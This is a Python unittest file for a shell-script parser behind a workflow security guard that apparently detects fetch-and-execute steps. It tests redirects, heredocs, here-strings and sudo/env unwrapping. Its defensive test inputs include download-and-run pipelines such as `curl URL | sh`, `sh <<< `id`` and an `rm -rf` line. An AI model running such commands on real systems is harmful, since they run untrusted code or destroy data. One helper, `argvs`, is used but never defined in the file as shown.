"""#1733 (COD-C2C): `shell_reader._stage`'s redirect parser, on its own.

`_REDIRECT` (`^(\\d*)(>>|>|<)(.*)$`) matched every `>`/`>>`/`<` token and filed
group(3) as a file read or write with no exception for a target that begins
with `&` -- so `2>&1` was recorded as a WRITE to a file named `&1`,
`2>/dev/null` as a write to `/dev/null`, and `>&2` as a write to `&2`,
contradicting this module's own docstring ("`2>&1` is neither").
`workflow_forms.parse_fetch` then took `stage.writes[-1]` as the download
destination unconditionally, so a stderr redirect on a `curl`/`wget` line
silently replaced (or invented) the file the fetch-and-exec guard thought it
was watching -- see `tests/test_workflow_guard.py` for the guard-level cases
that produced.

This file is the parser's own spec: a redirect whose target begins with `&`
(a file-descriptor duplication or close) is neither a read nor a write, and
`Stage.stdout_writes` is the subset of `Stage.writes` that a shell actually
delivers to file descriptor 1 -- the only one `parse_fetch` may treat as the
destination a step downloaded to.
"""
import gc
import time
import unittest

import shell_heredoc
import shell_lex
import shell_quote
import shell_reader


def stage(script):
    """The one stage of the one statement `script` parses to."""
    stmts = shell_reader.statements(script)
    assert len(stmts) == 1, stmts
    assert len(stmts[0].stages) == 1, stmts[0].stages
    return stmts[0].stages[0]


class LinearGrowth:
    """The reader's scaling checks, shared by every class that times it."""

    def assert_linear_growth(self, n, make, check):
        """Read `make(n)` and `make(4 * n)`, `check(size, parsed)` each, and
        require t(4n) <= 8 * t(n) + 0.25 s. Two sizes timed in one process
        measure how the reader grows -- about 4x for a linear pass, 16x for a
        quadratic one -- whatever the speed of the machine. Bounds in seconds
        sized on a dev box fail on CI's 3.11-3.13 jobs: traced for coverage on
        shared runners, they run the reader 6-9x slower.

        A ratio of wall-clock times still inflates when the process is
        descheduled during a read (9.1x and 11.3x in 16 runs on a box at
        load 45), so each read is timed in this process's CPU time, with
        the garbage collector off as `timeit` turns it off, and a miss is
        measured once more and judged on the lesser of each size's two times:
        a quadratic reader misses twice, a spike does not. The constant
        absorbs timer noise when t(n) is small; 15 s of CPU guards only
        against a catastrophe."""
        def read(size):
            script = make(size)
            enabled = gc.isenabled()
            gc.disable()
            try:
                start = time.process_time()
                parsed = shell_reader.statements(script)
                elapsed = time.process_time() - start
            finally:
                if enabled:
                    gc.enable()
            check(size, parsed)
            return elapsed

        small, large = read(n), read(4 * n)
        if large > 8 * small + 0.25:
            small, large = min(small, read(n)), min(large, read(4 * n))
        self.assertLessEqual(large, 8 * small + 0.25, (small, large))
        self.assertLess(large, 15.0, (small, large))


class TestFdDuplicationIsNeitherReadNorWrite(unittest.TestCase):
    """The module docstring's claim ("`2>&1` is neither"), held true by test."""

    def test_2_greater_ampersand_1_is_recorded_nowhere(self):
        s = stage("curl https://example.test/x -o /tmp/x 2>&1\n")
        self.assertEqual([], s.reads)
        self.assertEqual([], s.writes)
        self.assertEqual([], s.stdout_writes)

    def test_greater_ampersand_2_is_recorded_nowhere(self):
        s = stage("curl https://example.test/x >&2\n")
        self.assertEqual([], s.writes)
        self.assertEqual([], s.reads)
        self.assertEqual([], s.stdout_writes)

    def test_fd_close_is_recorded_nowhere(self):
        s = stage("curl https://example.test/x >&-\n")
        self.assertEqual([], s.writes)


class TestStdoutWrites(unittest.TestCase):
    """`writes` still carries every real file a redirect names (the existing
    consumers -- `workflow_guard.py`'s file-tracking -- stay correct);
    `stdout_writes` is only the ones a shell actually sends to file
    descriptor 1, which is the one `parse_fetch` may call the destination."""

    def test_an_explicit_other_fd_is_a_write_but_not_a_stdout_write(self):
        s = stage("curl https://example.test/x 2>err.log\n")
        self.assertEqual(["err.log"], s.writes)
        self.assertEqual([], s.stdout_writes)

    def test_a_bare_redirect_is_a_stdout_write(self):
        s = stage("curl https://example.test/x > out.log\n")
        self.assertEqual(["out.log"], s.writes)
        self.assertEqual(["out.log"], s.stdout_writes)

    def test_an_explicit_fd_1_redirect_is_a_stdout_write(self):
        s = stage("curl https://example.test/x 1>out.log\n")
        self.assertEqual(["out.log"], s.writes)
        self.assertEqual(["out.log"], s.stdout_writes)

    def test_append_form_is_also_a_stdout_write(self):
        s = stage("curl https://example.test/x >> out.log\n")
        self.assertEqual(["out.log"], s.writes)
        self.assertEqual(["out.log"], s.stdout_writes)


class TestCombinedStreamRedirectsAreARealDestination(unittest.TestCase):
    """Round 1 fix (opus review on 435e6f6): `&>word` and the UNNUMBERED
    `>&word` are bash's shorthand for `>word 2>&1` -- `word` is a real file,
    not a duplication target, whatever it looks like. Verified against real
    bash: `&>2` writes a file literally named `2` (no digit ambiguity at
    all for the `&>` spelling); `>&2extra` writes a file named `2extra`
    (ambiguous only when the word is ALL digits or `-`). `>&2`, `2>&1` and
    `>&-` -- where the remainder after `&` really is a duplication or a
    close -- still record nothing, attached or spaced."""

    SPELLINGS = (
        "curl https://example.test/x &>/tmp/i.sh\n",
        "curl https://example.test/x &> /tmp/i.sh\n",
        "curl https://example.test/x &>>/tmp/i.sh\n",
        "curl https://example.test/x >&/tmp/i.sh\n",
        "curl https://example.test/x >& /tmp/i.sh\n",
    )

    def test_each_spelling_is_a_stdout_write(self):
        for script in self.SPELLINGS:
            s = stage(script)
            self.assertEqual(["/tmp/i.sh"], s.stdout_writes, script)
            self.assertIn("/tmp/i.sh", s.writes, script)

    def test_amp_never_treats_an_all_digit_word_as_a_duplication(self):
        # `&>2`: real bash writes a file named `2`, unlike `>&2`.
        s = stage("curl https://example.test/x &>2\n")
        self.assertEqual(["2"], s.stdout_writes)

    def test_the_ambiguous_forms_still_record_nothing(self):
        for script in ("curl https://example.test/x >&2\n",
                       "curl https://example.test/x 2>&1\n",
                       "curl https://example.test/x >&-\n",
                       "curl https://example.test/x >& 2\n",
                       "curl https://example.test/x >& -\n"):
            s = stage(script)
            self.assertEqual([], s.stdout_writes, script)
            self.assertEqual([], s.writes, script)


class TestTheCaseHeaderProbeIsNotQuadratic(LinearGrowth, unittest.TestCase):
    """#1714 fix round, Critical 1: reading `case WORD in` cost O(n^2).

    The header probe re-ran `shlex.split` over the WHOLE accumulated buffer
    on EVERY whitespace character, so a single long statement was re-split
    once per word -- quadratic in the length of the statement. Measured on
    the parser as reviewed: 8 KB took 3.2 s, 16 KB 13.0 s and 42 KB 92.8 s,
    against 0.02 s before the probe existed. `shell_reader` reads the TARGET
    repository's `run:` blocks under `--security redteam`, so one long line
    in a hostile workflow was enough to stall the guard that reads it.

    A `case` header is three words (`case`, the word, `in`), so the probe
    only has to run while the buffer can still BE one: at most three times
    per statement, which makes `_split` linear again. The `case` cases in
    `tests/test_workflow_guard.py` are the other half of this spec -- the
    probe must still fire on every header it fired on before.

    Both 50 KB reads are timed as `LinearGrowth` times the reader: how each
    grows from a quarter of its size, in CPU time. The 2.0 s of wall clock
    they were held to failed with the reader unchanged once the process ran
    slower, as it does on a loaded box or traced for coverage (#2295).
    """

    def test_a_50kb_single_statement_parses_in_linear_time(self):
        def make(words):
            return "echo " + "a " * words + "\n"

        def check(words, parsed):
            self.assertEqual(1, len(parsed), parsed)
            self.assertEqual(words + 1, len(parsed[0].stages[0].argv))

        self.assertGreater(len(make(26000)), 50 * 1024)
        self.assert_linear_growth(6500, make, check)

    def test_a_second_case_header_on_the_same_line_is_still_read(self):
        # Caught by differentially parsing a corpus against the unbounded
        # probe: counting words from the SOURCE text read the `;` that ended
        # `esac` as a word of the next statement, so the bound expired one
        # word early and the second `case ... in` was never recognised --
        # which drops its arm markers, and an unmarked arm pattern is exactly
        # what put `b` where the command was expected. The count asks the
        # buffer instead.
        stmts = shell_reader.statements(
            "case $x in a) echo 1;; esac; case $y in b) echo 2;; esac\n")
        arms = [st.stages[0].argv[0] for st in stmts
                if st.stages[0].argv and shell_reader.is_arm(
                    st.stages[0].argv[0])]
        self.assertEqual(2, len(arms), stmts)
        self.assertTrue(arms[0].endswith("a)"), arms)
        self.assertTrue(arms[1].endswith("b)"), arms)

    def test_a_50kb_statement_that_really_is_a_case_header_is_fast_too(self):
        # The probe survives on a buffer whose first word IS `case`, so the
        # bound cannot be "give up once the statement is long".
        def check(_size, parsed):
            self.assertTrue(any(st.stages[0].argv[:1] == ["esac"] for st in parsed),
                            parsed)

        self.assert_linear_growth(
            50 * 1024 // 4, lambda size: "case " + "a" * size + " in x) :; esac\n", check)


class TestNestedCaseHeaders(unittest.TestCase):
    """#2617: a parent arm must not become the first word of an inner header."""

    def test_each_nested_header_and_arm_remains_a_statement(self):
        for depth in (2, 3):
            for gap in ("", " ", "\n"):
                script = ("case a in a)" + gap) * (depth - 1) + "case a in a) curl URL | sh"
                script += ";; esac" * depth
                with self.subTest(depth=depth, gap=gap):
                    parsed = shell_reader.statements(script)
                    heads = [statement.stages[0].argv for statement in parsed]
                    self.assertEqual(depth, sum(argv[:1] == ["case"] for argv in heads))
                    arms = [argv for argv in heads if argv and shell_reader.is_arm(argv[0])]
                    self.assertEqual(depth, len(arms), heads)
                    self.assertEqual([1] * (depth - 1), [len(argv) for argv in arms[:-1]])
                    commands = [shell_reader.command(s.argv) for st in parsed for s in st.stages]
                    self.assertIn(["curl", "URL"], commands)
                    self.assertIn(["sh"], commands)
                    self.assertFalse(any(s.group_close for st in parsed for s in st.stages))


if __name__ == "__main__":
    unittest.main()


class TestOrderedRedirects(unittest.TestCase):
    def test_descriptor_snapshots_and_opened_files(self):
        cases: tuple[tuple[str, list[str], list[str]], ...] = (
            ('3>f 1>&3', ['f'], ['f']),
            ('1>&3 3>f', ['f'], []),
            ('3>f 1>&3 3>g', ['f', 'g'], ['f']),
            ('>f 1>&2', ['f'], []),
            ('2>f 1>&2', ['f'], ['f']),
            ('>f 2>&1', ['f'], ['f']),
            ('2>&1>f', ['f'], ['f']),
            ('>|f', ['f'], ['f']),
            ('&>f', ['f'], ['f']),
            ('&>>f', ['f'], ['f']),
            ('>f 1>&-', ['f'], []),
            ('3>f 3>&- 1>&3', ['f'], []),
            ('3>f 1>& 3', ['f'], ['f']),
            ('>f >g', ['f', 'g'], ['g']),
        )
        for redirects, writes, stdout in cases:
            with self.subTest(redirects=redirects):
                parsed = stage('curl URL ' + redirects)
                self.assertEqual(writes, parsed.writes)
                self.assertEqual(stdout, parsed.stdout_writes)

    def test_attached_operators_are_lexical(self):
        for operator in ('>', '>>', '>|', '&>', '&>>'):
            with self.subTest(operator=operator):
                parsed = stage('curl URL' + operator + 'f')
                self.assertEqual(['curl', 'URL'], parsed.argv)
                self.assertEqual(['f'], parsed.writes)
                self.assertEqual(['f'], parsed.stdout_writes)

    def test_quoted_and_escaped_operators_stay_arguments(self):
        for literal, expected in ((r'URL\>f', 'URL>f'), ('"URL>f"', 'URL>f'),
                                  ("'URL&>f'", 'URL&>f'), ('">f"', '>f'),
                                  (r'\>f', '>f'), ('"2">f', '2')):
            with self.subTest(literal=literal):
                parsed = stage('echo ' + literal)
                self.assertEqual(['echo', expected], parsed.argv)
                self.assertEqual(['f'] if literal == '"2">f' else [], parsed.writes)


class TestMarkerProvenance(unittest.TestCase):
    LITERALS = ('@@subst0@@', '@@heredoc0@@', '@@casearm@@curl',
                '@@group-open@@', '@@group-close@@')

    def test_literals_are_ordinary_words_and_filenames(self):
        for literal in self.LITERALS:
            for suffix in ('', ' "$(echo actual)"'):
                with self.subTest(literal=literal, suffix=suffix):
                    parsed = stage(literal + ' "' + literal + '" > ' + literal + suffix)
                    self.assertEqual(literal, shell_reader.command(parsed.argv)[0])
                    self.assertEqual(literal, parsed.argv[1])
                    self.assertEqual([literal], parsed.stdout_writes)
                    self.assertFalse(shell_reader.is_marker(parsed.stdout_writes[0]))
                    self.assertEqual(literal, shell_reader.readable(parsed.argv[1]))
                    self.assertEqual(['echo actual'] if suffix else [], parsed.substitutions)

    def test_literal_heredoc_does_not_steal_real_body(self):
        parsed = shell_reader.statements("echo @@heredoc0@@; cat <<'EOF'\nbody\nEOF")
        self.assertEqual(['echo', '@@heredoc0@@'], parsed[0].stages[0].argv)
        self.assertIsNone(parsed[0].stages[0].heredoc)
        self.assertEqual('body', parsed[1].stages[0].heredoc)

    def test_repeated_and_nested_parses_do_not_share_markers(self):
        first = stage('echo "$(echo first)"').argv[1]
        second = stage('echo "$(echo second)"').argv[1]
        self.assertNotEqual(first, second)
        self.assertTrue(shell_reader.is_marker(first))
        self.assertEqual('$(...)', shell_reader.readable(first))
        self.assertFalse(shell_reader.is_marker(str(first)))
        nested = stage('echo ' + first + ' "$(echo nested)"')
        self.assertEqual(['echo nested'], nested.substitutions)
        self.assertFalse(shell_reader.is_marker(nested.argv[1]))
        self.assertEqual(first, nested.argv[1])


class TestConsecutiveRedirectBoundaries(unittest.TestCase):
    def test_numeric_redirect_operands_are_not_next_io_numbers(self):
        for redirects, writes, stdout in (
            ('3>f 1>&3>g', ['f', 'g'], ['g']),
            ('3>f 1>&3 3>&-', ['f'], ['f']),
            ('>2>f', ['2', 'f'], ['f']),
            ('> 2>f', ['2', 'f'], ['f']),
            ('>&2>f', ['f'], ['f']),
            ('2>f 1>&2>g', ['f', 'g'], ['g']),
        ):
            with self.subTest(redirects=redirects):
                parsed = stage('curl URL ' + redirects)
                self.assertEqual(writes, parsed.writes)
                self.assertEqual(stdout, parsed.stdout_writes)
                self.assertEqual(['curl', 'URL'], parsed.argv)


class TestRedirectLexicalControls(unittest.TestCase):
    def test_escaped_quote_does_not_end_a_quoted_operator(self):
        parsed = stage(r'echo "quoted\">f" "2>&1" 2\>f')
        self.assertEqual(['echo', 'quoted">f', '2>&1', '2>f'], parsed.argv)
        self.assertEqual([], parsed.writes)

    def test_fd_numbers_do_not_require_unbounded_integer_conversion(self):
        descriptor = '3' * 5000
        parsed = stage('curl URL ' + descriptor + '>f 1>&' + descriptor)
        self.assertEqual(['f'], parsed.stdout_writes)

    def test_new_marker_shape_from_another_parse_has_no_capability(self):
        outer = stage('echo $(echo outer)').argv[1]
        parsed = stage(str(outer) + ' >' + str(outer) + ' $(echo inner)')
        self.assertEqual(outer, shell_reader.command(parsed.argv)[0])
        self.assertEqual([str(outer)], parsed.stdout_writes)
        self.assertFalse(shell_reader.has_substitution(parsed.stdout_writes[0]))
        self.assertEqual(['echo inner'], parsed.substitutions)

    def test_markers_do_not_hide_inside_a_genuine_case_arm(self):
        for literal in TestMarkerProvenance.LITERALS:
            parsed = shell_reader.statements('case x in a|b) ' + literal + ';; esac')
            arm = next(s.stages[0] for s in parsed if shell_reader.is_arm(s.stages[0].argv[0]))
            self.assertEqual([literal], shell_reader.command(arm.argv))


class TestGroupRedirectBoundaries(unittest.TestCase):
    def test_io_numbers_immediately_after_group_tokens_are_not_argv(self):
        for script, writes, stdout in (
            ('(1>f curl URL)', ['f'], ['f']),
            ('(3>f 1>&3 curl URL)', ['f'], ['f']),
            ('(curl URL)1>f', ['f'], ['f']),
            ('(curl URL>f)2>g', ['f', 'g'], ['f']),
            ('((3>f 1>&3 curl URL))', ['f'], ['f']),
        ):
            with self.subTest(script=script):
                parsed = stage(script)
                self.assertEqual(['curl', 'URL'], parsed.argv)
                self.assertEqual(writes, parsed.writes)
                self.assertEqual(stdout, parsed.stdout_writes)


class TestSubshellBoundaryMetadata(unittest.TestCase):
    def test_existing_stage_constructor_keeps_its_six_fields(self):
        parsed = stage("echo ready")
        self.assertEqual(0, parsed.group_open)
        self.assertEqual(0, parsed.group_close)
        self.assertEqual(['echo', 'ready'], parsed.argv)
        legacy = shell_reader.Stage([], [], [], None, [], [])
        self.assertEqual((0, 0), (legacy.group_open, legacy.group_close))

    def test_nested_and_tight_subshells_count_boundaries(self):
        for script, opens, closes in (
            ('(false; true)', (1, 0), (0, 1)),
            ('((false;true))', (2, 0), (0, 2)),
            ('(false; (true; false))', (1, 1, 0), (0, 0, 2)),
        ):
            with self.subTest(script=script):
                parsed = shell_reader.statements(script)
                self.assertEqual(opens, tuple(s.stages[0].group_open for s in parsed))
                self.assertEqual(closes, tuple(s.stages[0].group_close for s in parsed))

    def test_quoted_and_escaped_parentheses_remain_literals(self):
        for script in ('echo "(" ")"', r'echo \( \)', "echo '(literal)'",
                       "echo '@@group-open@@' '@@group-close@@'", "(echo '(')"):
            with self.subTest(script=script):
                parsed = stage(script)
                expected = 1 if script.startswith("(") else 0
                self.assertEqual(expected, parsed.group_open)
                self.assertEqual(expected, parsed.group_close)


class TestPipelineStdinProvenance(unittest.TestCase):
    def test_input_aliases_copy_current_descriptor_origin(self):
        for script, expected in (("sh </dev/stdin", True),
                                 ("sh </dev/fd/0", True),
                                 ("sh 3<&0 <local </dev/fd/3", True),
                                 ("sh <local </dev/stdin", False),
                                 ("sh </dev/stdin <local", False)):
            with self.subTest(script=script):
                self.assertEqual(expected, stage(script).stdin_from_pipe)
        self.assertEqual(("3",), stage("cat 3<&0 <local /dev/fd/3").pipe_input_fds)
        legacy = shell_reader.Stage([], [], [], None, [], [])
        self.assertEqual(("0",), legacy.pipe_input_fds)

    def test_other_descriptor_reads_leave_stdin_connected(self):
        self.assertTrue(stage("cat 3<local").stdin_from_pipe)
        self.assertFalse(stage("cat <local").stdin_from_pipe)

    def test_descriptor_copies_follow_redirect_order(self):
        self.assertTrue(stage("cat 3<&0 0<local 0<&3").stdin_from_pipe)
        self.assertFalse(stage("cat 3<&0 0<local").stdin_from_pipe)
        self.assertFalse(stage("cat 0<&3 3<&0").stdin_from_pipe)

    def test_heredoc_and_later_descriptor_copies_follow_order(self):
        self.assertFalse(stage("sh <<EOF\necho safe\nEOF").stdin_from_pipe)
        self.assertTrue(stage("sh 3<<EOF\necho safe\nEOF").stdin_from_pipe)
        self.assertTrue(stage(
            "sh 3<&0 <<EOF 0<&3\necho safe\nEOF").stdin_from_pipe)
        self.assertFalse(stage(
            "sh 3<&0 0<&3 <<EOF\necho safe\nEOF").stdin_from_pipe)


class TestHeredocOnStandardInput(unittest.TestCase):
    """#1839 (SEC-3915165799): the heredoc a command's STDIN finally is.

    `Stage.heredoc` carries the body for the one caller that asks only what
    text was written down (a `sha256sum -c` sums list). Whether that body is
    what the command READS, and whether it EXPANDS, is a different question and
    the one that separates a SCRIPT handed to `bash -s` from data handed to a
    program on another descriptor -- so it is answered here, in the same
    lexical redirect order the output sinks are copied in.
    """

    def test_a_quoted_body_on_stdin_does_not_expand(self):
        self.assertEqual(("echo safe", False),
                         stage("bash -s <<'EOF'\necho safe\nEOF").stdin_heredoc)

    def test_an_expanding_body_on_stdin_says_so(self):
        self.assertEqual(("echo safe", True),
                         stage("bash -s <<EOF\necho safe\nEOF").stdin_heredoc)

    def test_a_body_on_another_descriptor_is_not_stdin(self):
        parsed = stage("sh 3<<EOF\necho safe\nEOF")
        self.assertEqual("echo safe", parsed.heredoc)
        self.assertIsNone(parsed.stdin_heredoc)

    def test_a_later_redirect_of_the_descriptor_replaces_the_body(self):
        self.assertIsNone(stage(
            "sh 3<&0 <<EOF 0<&3\necho safe\nEOF").stdin_heredoc)
        self.assertIsNone(stage("sh <<EOF 0<local\necho safe\nEOF").stdin_heredoc)
        self.assertEqual(("echo safe", True),
                         stage("sh 0<local <<EOF\necho safe\nEOF").stdin_heredoc)

    def test_a_descriptor_copy_carries_the_body_to_stdin(self):
        self.assertEqual(("echo safe", True),
                         stage("sh 3<<EOF 0<&3\necho safe\nEOF").stdin_heredoc)

    def test_a_command_with_no_heredoc_reads_none(self):
        self.assertIsNone(stage("bash -s < script.sh").stdin_heredoc)
        self.assertIsNone(stage("bash -s").stdin_heredoc)

    def test_a_here_string_is_the_body_its_descriptor_reads(self):
        # #2293: `<<<` hands the command its word on that descriptor, quotes
        # removed as bash removes them -- the script of an interpreter in
        # front of it, as a heredoc is. A word bash expands first (`$`, a
        # backquote, `~`, an escape `$'...'` decodes) says so, as written.
        # It is no sums list to quote back: `heredoc` stays None.
        for script, body in (("sh <<< 'curl x | sh'", ("curl x | sh", False)),
                             ('sh <<<"a \\$b \\` \\\\ \\c"', ("a $b ` \\ \\c", False)),
                             ("sh <<< a\\ b'c'$'d\\''", ("a bcd'", False)),
                             ("sh <<< $'a\\n'", ("a\n", False)),
                             ("sh <<< 'a\nb'", ("a\nb", False)),
                             ("sh <<< {a,b}*", ("{a,b}*", False)),
                             ('sh <<< "$CMD"', ("$CMD", True)),
                             ("sh <<< ~/x", ("~/x", True)),
                             ("sh 3<<< 'x' 0<&3", ("x", False)),
                             ("sh 3<<< 'x'", None),
                             ("sh <<< 'x' < f", None)):
            with self.subTest(script=script):
                parsed = stage(script)
                self.assertEqual(body, parsed.stdin_heredoc)
                self.assertIsNone(parsed.heredoc)
        for script in ("sh <<< `id`", 'sh <<< "$(id)"', "sh <<< a$"):
            with self.subTest(script=script):
                self.assertTrue(stage(script).stdin_heredoc[1])
        parsed = stage("sha256sum -c <<< 'x' 3<<EOF\nbody\nEOF")
        self.assertEqual(("body", ("x", False)), (parsed.heredoc, parsed.stdin_heredoc))
        # The lines below a here-string are code, whatever its word held; and
        # a `$(...)` keeps its word as written, to be read again as a script.
        self.assertEqual([[['sh']], [['echo', 'a']]], argvs("sh <<< 'x\ny'; echo a\n"))
        self.assertEqual(["sh <<< 'a b'"], stage("echo $(sh <<< 'a b')").substitutions)


class TestPipelineStdoutProvenance(unittest.TestCase):
    def test_stdout_aliases_and_redirect_order(self):
        self.assertTrue(stage("cat >/dev/stdout").stdout_to_pipe)
        self.assertTrue(stage("cat >/dev/fd/1").stdout_to_pipe)
        self.assertFalse(stage("cat >/dev/stdout >saved").stdout_to_pipe)
        self.assertFalse(stage("cat >saved >/dev/stdout").stdout_to_pipe)
        self.assertFalse(stage("cat >saved >/dev/fd/1").stdout_to_pipe)
        self.assertTrue(stage("cat 3>&1 >saved 1>&3").stdout_to_pipe)
        self.assertTrue(stage("cat 3>&1 >/dev/null >&3").stdout_to_pipe)
        self.assertEqual(["saved"], stage("cat >saved >/dev/stdout").stdout_writes)


class TestCombinedPipelineOperator(unittest.TestCase):
    def test_operator_retains_two_stages_and_ordered_copies(self):
        for redirects, streaming, sinks in (
            ('', True, []), ('2>err', True, []), ('>saved', False, ['saved']),
            ('2>&1 >saved', False, ['saved']), ('3>&1 >saved 1>&3', True, []),
            ('2>&-', True, []),
        ):
            with self.subTest(redirects=redirects):
                statements = shell_reader.statements(f'curl URL {redirects} |& sh')
                self.assertEqual(1, len(statements))
                self.assertEqual(2, len(statements[0].stages))
                left, right = statements[0].stages
                self.assertEqual(['curl', 'URL'], left.argv)
                self.assertEqual(['sh'], right.argv)
                self.assertEqual(streaming, left.stdout_to_pipe)
                self.assertEqual(sinks, left.stdout_writes)
        # The implicit 2>&1 itself must be authentic, not just skipped text:
        # stderr's old file sink must not remain the source of fd 1 here.
        left = shell_reader.statements('curl URL 2>err 1>&2 |& sh')[0].stages[0]
        self.assertEqual(['err'], left.stdout_writes)
        # Copying an input origin onto stdout exposes whether the implicit
        # stderr copy really reached the descriptor engine (Stage is unchanged).
        left = shell_reader.statements('cat 1<&0 |& sh')[0].stages[0]
        self.assertEqual(('0', '1', '2'), left.pipe_input_fds)

    def test_quoted_escaped_case_and_other_operators(self):
        for literal in ('"|&"', "'|&'", r'\|\&'):
            self.assertEqual(['echo', '|&'], stage('echo ' + literal).argv)
        parsed = shell_reader.statements('false || echo ready & echo done')
        self.assertEqual(['||', '&', ''], [stmt.separator for stmt in parsed])
        parsed = shell_reader.statements('case x in a|b) echo "|&";; esac')
        self.assertTrue(all(len(stmt.stages) == 1 for stmt in parsed))


class TestWrapperOptionOperands(unittest.TestCase):
    def test_supported_option_arities(self):
        for prefix in ('sudo -u root', 'sudo -uroot', 'sudo --user=root --',
                       'timeout -k 5 300', 'timeout -k5 300',
                       'timeout --kill-after=5 -- 300', 'nice -n 10', 'nice -n10',
                       'nice --adjustment=10', 'env -u VAR', 'env -uVAR',
                       'env --unset=VAR --', 'sudo -nE -g wheel -u root',
                       'env -i NAME=value nice -n 10', 'stdbuf -o L -e0',
                       'xargs -n 1 -P2', 'xargs --replace', 'xargs --replace={}',
                       'xargs --max-lines=2', 'exec -a alias', 'command -p', 'nohup'):
            with self.subTest(prefix=prefix):
                argv = stage(prefix + ' curl URL').argv
                self.assertEqual(['curl', 'URL'], shell_reader.command(argv))
                self.assertEqual(['ordinary', 'curl', 'URL'], shell_reader.command(
                    stage(prefix + ' ordinary curl URL').argv))

    def test_token_provenance_survives_unwrapping(self):
        argv = shell_reader.command(stage('sudo -u root curl "$(echo URL)"').argv)
        self.assertTrue(shell_reader.has_substitution(argv[1]))
        self.assertEqual('$(...)', shell_reader.readable(argv[1]))

    def test_unresolved_wrappers_keep_their_argv(self):
        for argv in (['sudo', '--unknown-flag', 'curl'],
                     ['sudo', '-K', 'curl'],
                     ['sudo', '--remove-timestamp', 'curl'],
                     ['sudo', '-l', '-K'],
                     ['sudo', '-u', 'curl'],
                     ['env', '--default-signal=BOGUS', 'curl'],
                     ['env', '-S', '"unterminated', 'curl']):
            with self.subTest(argv=argv):
                self.assertEqual(argv, shell_reader.command(argv))
                self.assertIsNotNone(shell_reader.unresolved_wrapper(argv))
        for argv in (['sudo', '-K'], ['sudo', '--remove-timestamp'],
                     ['sudo', '--preserve-groups', 'curl'],
                     ['sudo', '-l', 'curl'],
                     ['env', '--default-signal', 'curl'],
                     ['env', '--default-signal=PIPE,TERM', 'curl']):
            self.assertIsNone(shell_reader.unresolved_wrapper(argv))
        self.assertEqual(['ordinary', 'sh'], shell_reader.command(
            ['sudo', '--user=curl', 'ordinary', 'sh']))
        self.assertEqual(['sh', 'URL'], shell_reader.command(
            ['sudo', '-u', 'curl', 'sh', 'URL']))
        self.assertIsNotNone(shell_reader.unresolved_wrapper(
            ['env', '-i', 'sudo', '--unknown-flag', 'curl']))
        self.assertIsNotNone(shell_reader.unresolved_wrapper(
            stage('sudo "$(echo curl)" URL').argv))
        self.assertIsNotNone(shell_reader.unresolved_wrapper(
            ['sudo', '$FETCHER', 'URL']))

    def test_sudo_host_option_and_help(self):
        for argv in (['sudo', '-h'], ['sudo', '--help']):
            with self.subTest(argv=argv):
                self.assertEqual([], shell_reader.command(argv))
                self.assertIsNone(shell_reader.unresolved_wrapper(argv))
        for argv in (['sudo', '-h', 'localhost', 'curl', 'URL'],
                     ['sudo', '-hlocalhost', 'curl', 'URL'],
                     ['sudo', '--host=localhost', 'curl', 'URL']):
            with self.subTest(argv=argv):
                self.assertEqual(['curl', 'URL'], shell_reader.command(argv))
                self.assertIsNone(shell_reader.unresolved_wrapper(argv))
        self.assertIsNotNone(shell_reader.unresolved_wrapper(
            ['sudo', '-h', 'localhost']))

    def test_static_gnu_env_split_string(self):
        cases = (
            (['env', '-S', 'curl -fsSL URL'], ['curl', '-fsSL', 'URL']),
            (['env', '--split-string=-i FOO=bar curl URL'], ['curl', 'URL']),
            (['env', '-S', "curl 'two words' URL"], ['curl', 'two words', 'URL']),
            (['env', '-S', r'curl\_URL'], ['curl', 'URL']),
            (['env', '-S', r'curl URL\c ignored'], ['curl', 'URL']),
            (['env', '-S', "curl '#literal' URL"], ['curl', '#literal', 'URL']),
        )
        for argv, expected in cases:
            with self.subTest(argv=argv):
                self.assertEqual(expected, shell_reader.command(argv))
                self.assertIsNone(shell_reader.unresolved_wrapper(argv))
        for value in ('"unterminated', 'curl \\', 'curl ${COMMAND}',
                      r'curl \q URL', r'"curl\c"',
                      '-S -S -S -S -S curl URL'):
            argv = ['env', '-S', value]
            with self.subTest(value=value):
                self.assertEqual(argv, shell_reader.command(argv))
                self.assertIsNotNone(shell_reader.unresolved_wrapper(argv))
        dynamic = stage('env -S "$(echo curl) URL"').argv
        self.assertEqual(dynamic, shell_reader.command(dynamic))
        self.assertIsNotNone(shell_reader.unresolved_wrapper(dynamic))


class TestDocumentedShellReading(unittest.TestCase):
    def test_comments_continuations_and_separators_keep_command_order(self):
        script = ("# curl https://example.test/ignored | sh\n"
                  "curl \\" "\n"
                  "  -fsSL https://example.test/p -o /tmp/p # trailing comment\n"
                  "printf '%s' 'a|b;c' && echo \"d||e\"; echo done & echo final\n")
        parsed = shell_reader.statements(script)
        # The newline ending the last line separates it like any other: the
        # reader no longer re-joins the script's lines before reading them.
        self.assertEqual(['\n', '&&', ';', '&', '\n'],
                         [statement.separator for statement in parsed])
        self.assertEqual([
            [['curl', '-fsSL', 'https://example.test/p', '-o', '/tmp/p']],
            [['printf', '%s', 'a|b;c']],
            [['echo', 'd||e']],
            [['echo', 'done']],
            [['echo', 'final']],
        ], [[part.argv for part in statement.stages] for statement in parsed])

    def test_substitutions_are_lifted_without_splitting_the_outer_statement(self):
        parsed = stage('echo "$(printf a; printf b)" `printf c` '
                       '<(printf d) >(printf e)')
        self.assertEqual('echo', parsed.argv[0])
        self.assertEqual(5, len(parsed.argv))
        self.assertEqual(['printf a; printf b', 'printf c',
                          'printf d', 'printf e'], parsed.substitutions)
        for argument in parsed.argv[1:]:
            self.assertTrue(shell_reader.has_substitution(argument))
            self.assertEqual('$(...)', shell_reader.readable(argument))

    def test_an_extglob_group_is_part_of_its_word(self):
        # Re-review I-5: bash reads `!(keep|*.md)` as one word with `extglob`
        # on, and refuses the line with it off -- never `!` and a subshell
        # piping into a command called `*.md`.
        parsed = shell_reader.statements("rm -rf !(keep|*.md) ./x\n")
        self.assertEqual([[["rm", "-rf", "!(keep|*.md)", "./x"]]],
                         [[part.argv for part in statement.stages] for statement in parsed])
        # A `$(...)` in it is lifted, as anywhere; where a command starts, the
        # word is one bash expands, as `*(...)` is.
        self.assertEqual(["curl u"], stage("echo @($(curl u)|x)").substitutions)
        self.assertIn("is a pattern", shell_reader.unresolved_wrapper(stage("@(sh) -c x").argv))

    def test_unquoted_heredoc_expands_but_quoted_heredoc_is_literal(self):
        parsed = shell_reader.statements(
            "cat <<EOF\n$(printf expanded)\nEOF\n"
            "cat <<'EOF'\n$(printf literal)\nEOF\n")
        self.assertEqual(['\n', '\n'], [statement.separator for statement in parsed])
